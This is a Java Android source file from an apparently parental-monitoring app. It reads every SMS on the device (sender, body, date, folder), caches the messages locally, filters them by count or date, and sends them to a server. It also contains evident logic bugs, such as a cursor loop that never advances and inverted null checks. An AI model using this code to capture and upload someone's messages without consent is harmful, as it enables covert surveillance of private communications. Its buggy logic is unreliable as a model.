package com.kidguard.asynctask;


import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;

import com.j256.ormlite.android.apptools.OpenHelperManager;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.stmt.QueryBuilder;
import com.kidguard.interfaces.Constant;
import com.kidguard.model.Sms;
import com.kidguard.orm.DatabaseHelper;
import com.kidguard.services.BackgroundDataService;
import com.kidguard.utilities.Utilities;

import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

@SuppressWarnings("all")
public class SmsAsyncTask extends AsyncTask<String, Void, ArrayList<Sms>> implements Constant {
    private static final String TAG = SmsAsyncTask.class.getSimpleName();

    private DatabaseHelper databaseHelper = null;
    private Dao<Sms, Integer> smsDao;
    private ArrayList lstSms;
    private Context context;

    /* Sms Constructor */
    public SmsAsyncTask(Context context) {
        this.context = context;
    }

    /* DatabaseHelper */
    private DatabaseHelper getHelper() {
        if (databaseHelper == null) {
            databaseHelper = OpenHelperManager.getHelper(context, DatabaseHelper.class);
        }
        return databaseHelper;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        lstSms = new ArrayList<Sms>();
    }

    @Override
    protected ArrayList<Sms> doInBackground(String... params) {
        Cursor c = null;
        try {
            Uri message = Uri.parse("content://sms/");
            ContentResolver cr = context.getContentResolver();
            c = cr.query(message, null, null, null, null);

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.HONEYCOMB) {
                ((Activity) context).startManagingCursor(c);
            }

            try {
                // This is how, a reference of DAO object can be done
                smsDao = getHelper().getSmsDao();
                if (smsDao.isTableExists()) {
                    long numRows = smsDao.countOf();
                    if (numRows != 0) {
                        int totalSMS = c.getCount();
                        final QueryBuilder<Sms, Integer> queryBuilder = smsDao.queryBuilder();
                        for (int i = 0; i < smsDao.queryForAll().size(); i++) {
                            if (c.moveToFirst()) {
                                for (int j = 0; j < totalSMS; j++) {

                                    List<Sms> results = queryBuilder.where()
                                            .eq(Sms.SMS_ID,
                                                    c.getString(c.getColumnIndexOrThrow("_id"))).query();

                                    if (results.size() == 0) {
                                        setSmsPOJO(c);
                                    }
                                }
                            }
                        }

                    } else {
                        int totalSMS = c.getCount();
                        if (c.moveToFirst()) {
                            for (int i = 0; i < totalSMS; i++) {
                                setSmsPOJO(c);
                                c.moveToNext();
                            }
                        }
                    }

                    c.close();

                    // SMS Fetch With Tag
                    lstSms = smsFetchWithTag(smsDao, params[0], params[1], params[2]);
                }

            } catch (SQLException e) {
                Log.e("SQLException", "SQLException???" + e.getMessage());
                e.printStackTrace();
            }
        } catch (Exception e) {

        } finally {
            try {
                if (c != null && !c.isClosed())
                    c.close();

            } catch (Exception ex) {
            }
        }

        return lstSms;
    }

    @Override
    protected void onPostExecute(ArrayList<Sms> smsList) {
        super.onPostExecute(smsList);
        // Release databaseHelper
        if (databaseHelper != null) {
            OpenHelperManager.releaseHelper();
            databaseHelper = null;
        }

        if (smsList != null && smsList.size() > 0)
            Log.e("Size", "SMS List???" + smsList.size());
        BackgroundDataService.getInstance().sendSmsDataToServer(smsList);
    }

    /* setSmsPOJO With Cursor*/
    private void setSmsPOJO(Cursor c) {
        try {
            final Sms objSms = new Sms();
            objSms.setSmsId(c.getString(c.getColumnIndexOrThrow("_id")));
            objSms.setAddress(c.getString(c.getColumnIndexOrThrow("address")));
            objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
            objSms.setReadState(c.getString(c.getColumnIndex("read")));
            objSms.setDate(Utilities.changeDateFormat(c.getString(c.getColumnIndexOrThrow("date"))));
            objSms.setDate_timestamp(c.getString(c.getColumnIndexOrThrow("date")));
            objSms.setSms_status(FALSE);
            if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                objSms.setFolderName("inbox");
            } else {
                objSms.setFolderName("sent");
            }

            smsDao.createOrUpdate(objSms);
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

    /* setSmsPOJO With List*/
    private void setSmsPOJO(ArrayList<Sms> lstSmsSorted, List<Sms> results, int i) {
        final Sms objSms = new Sms();
        objSms.setSmsId(results.get(i).getSmsId());
        objSms.setAddress(results.get(i).getAddress());
        objSms.setMsg(results.get(i).getMsg());
        objSms.setReadState(results.get(i).getReadState());
        objSms.setDate(results.get(i).getDate());
        objSms.setDate_timestamp(results.get(i).getDate_timestamp());
        objSms.setSms_status(results.get(i).getSms_status());
        objSms.setFolderName(results.get(i).getFolderName());
        lstSmsSorted.add(objSms);
    }

    /* checkCount */
    private void checkCount(ArrayList<Sms> lstSmsSorted, List<Sms> results, String count, int countNew) {

        if (results != null && results.size() > 0) {
            if (Integer.parseInt(count) == results.size()) {
                countNew = Integer.parseInt(count);
            } else if (Integer.parseInt(count) < results.size()) {
                countNew = Integer.parseInt(count);
            } else if (Integer.parseInt(count) > results.size()) {
                countNew = results.size();
            }

            for (int i = 0; i < countNew; i++) {
                setSmsPOJO(lstSmsSorted, results, i);
            }
        }
    }

    /* smsFetchWithTag */
    private ArrayList<Sms> smsFetchWithTag(Dao<Sms, Integer> smsDao, String count, String dateFrom, String dateTo) {
        ArrayList<Sms> lstSmsSorted = new ArrayList<>();
        int countNew = 0;
        final QueryBuilder<Sms, Integer> queryBuilder = smsDao.queryBuilder();
        //queryBuilder.orderBy(Sms.SMS_ID, false); // descending sort
        try {

            if (!count.equals("") && dateFrom.equals("") && dateTo.equals("")) {
                Log.d("1", "1??");
                List<Sms> results = null;
                results = queryBuilder.where().eq(Sms.SMS_STATUS, FALSE).query();

                checkCount(lstSmsSorted, results, count, countNew);

                return lstSmsSorted;
            }

            if (count.equals("") && !dateFrom.equals("") && !dateTo.equals("")) {
                Log.e("2", "2??");

                List<Sms> resultDateFrom = queryBuilder.where().like(Sms.SMS_DATE, dateFrom).query();
                List<Sms> resultDateTo = queryBuilder.where().like(Sms.SMS_DATE, dateTo).query();

                if (resultDateFrom.size() == 0 && resultDateTo.size() == 0) {
                     if (getResultedDateFromTo(queryBuilder, dateFrom, dateTo) == null
                            && getResultedDateFromTo(queryBuilder, dateFrom, dateTo).size() == 0) {
                        return null;
                    }
                    dateFrom = getResultedDateFromTo(queryBuilder, dateFrom, dateTo).get(0);
                    dateTo = getResultedDateFromTo(queryBuilder, dateFrom, dateTo)
                            .get(getResultedDateFromTo(queryBuilder, dateFrom, dateTo).size() - 1);


                } else if (resultDateFrom.size() == 0) {
                    if (getResultedDateFromTo(queryBuilder, dateFrom, dateTo) == null
                            && getResultedDateFromTo(queryBuilder, dateFrom, dateTo).size() == 0) {
                        dateFrom = dateTo;

                    } else {
                        dateFrom = getResultedDateFromTo(queryBuilder, dateFrom, dateTo).get(0);

                    }

                } else if (resultDateTo.size() == 0) {
                    if (getResultedDateFromTo(queryBuilder, dateFrom, dateTo) == null
                            && getResultedDateFromTo(queryBuilder, dateFrom, dateTo).size() == 0) {
                        dateTo = dateFrom;

                    } else {
                        dateTo = getResultedDateFromTo(queryBuilder, dateFrom, dateTo)
                                .get(getResultedDateFromTo(queryBuilder, dateFrom, dateTo).size() - 1);

                    }
                }


                if (dateFrom.equals(dateTo)) {

                    List<Sms> results = null;
                    results = queryBuilder.where().eq(Sms.SMS_DATE, dateFrom)
                            .and().eq(Sms.SMS_STATUS, FALSE).query();

                    if (results != null && results.size() > 0) {
                        for (int j = 0; j < results.size(); j++) {
                            setSmsPOJO(lstSmsSorted, results, j);
                        }
                    }

                } else {
                    List<Sms> results = null;
                    results = queryBuilder.where().between(Sms.SMS_DATE, dateFrom, dateTo)
                            .and().eq(Sms.SMS_STATUS, FALSE).query();

                    if (results != null && results.size() > 0) {
                        for (int j = 0; j < results.size(); j++) {
                            setSmsPOJO(lstSmsSorted, results, j);
                        }
                    }
                }

                return lstSmsSorted;
            }

            if (!count.equals("") && !dateFrom.equals("") && !dateTo.equals("")) {
                Log.d("3", "3??");

                List<Sms> resultDateFrom = queryBuilder.where().like(Sms.SMS_DATE, dateFrom).query();
                List<Sms> resultDateTo = queryBuilder.where().like(Sms.SMS_DATE, dateTo).query();

                if (resultDateFrom.size() == 0 && resultDateTo.size() == 0) {
                    if (getResultedDateFromTo(queryBuilder, dateFrom, dateTo) == null
                            && getResultedDateFromTo(queryBuilder, dateFrom, dateTo).size() == 0) {
                        return null;
                    }
                    dateFrom = getResultedDateFromTo(queryBuilder, dateFrom, dateTo).get(0);
                    dateTo = getResultedDateFromTo(queryBuilder, dateFrom, dateTo)
                            .get(getResultedDateFromTo(queryBuilder, dateFrom, dateTo).size() - 1);


                } else if (resultDateFrom.size() == 0) {
                    if (getResultedDateFromTo(queryBuilder, dateFrom, dateTo) == null
                            && getResultedDateFromTo(queryBuilder, dateFrom, dateTo).size() == 0) {
                        dateFrom = dateTo;

                    } else {
                        dateFrom = getResultedDateFromTo(queryBuilder, dateFrom, dateTo).get(0);

                    }

                } else if (resultDateTo.size() == 0) {
                    if (getResultedDateFromTo(queryBuilder, dateFrom, dateTo) == null
                            && getResultedDateFromTo(queryBuilder, dateFrom, dateTo).size() == 0) {
                        dateTo = dateFrom;

                    } else {
                        dateTo = getResultedDateFromTo(queryBuilder, dateFrom, dateTo)
                                .get(getResultedDateFromTo(queryBuilder, dateFrom, dateTo).size() - 1);

                    }
                }

                List<Sms> results = null;
                if (dateFrom.equals(dateTo)) {
                    results = queryBuilder.where().eq(Sms.SMS_DATE, dateFrom).and().eq(Sms.SMS_STATUS, FALSE).query();
                } else {
                    results = queryBuilder.where().between(Sms.SMS_DATE, dateFrom, dateTo).and().eq(Sms.SMS_STATUS, FALSE).query();
                }

                checkCount(lstSmsSorted, results, count, countNew);

                return lstSmsSorted;
            }

            List<Sms> results = null;
            if (count.equals("") && dateFrom.equals("") && dateTo.equals("")) {
                Log.d("4", "4??");
                results = smsDao.queryForAll();
                if (results != null && results.size() > 0) {
                    for (int j = 0; j < results.size(); j++) {
                        setSmsPOJO(lstSmsSorted, results, j);
                    }
                }

                return lstSmsSorted;
            }

        } catch (SQLException e) {
            e.printStackTrace();
        }
        return lstSmsSorted;
    }

    /* Get Resulted DateFrom To */
    private List<String> getResultedDateFromTo(QueryBuilder<Sms,
            Integer> queryBuilder, String dateFrom, String dateTo) {
        List<String> sortList = new ArrayList<>();
        try {
            List<Sms> results = null;

            results = queryBuilder.where().between(Sms.SMS_DATE, dateFrom, dateTo)
                    .and().eq(Sms.SMS_STATUS, FALSE).query();

            if (results != null && results.size() > 0) {
                for (int i = 0; i < results.size(); i++) {
                    sortList.add(results.get(i).getDate());
                }
                Collections.sort(sortList);
            }

        } catch (SQLException e) {
            e.printStackTrace();
        }

        return sortList;
    }

}
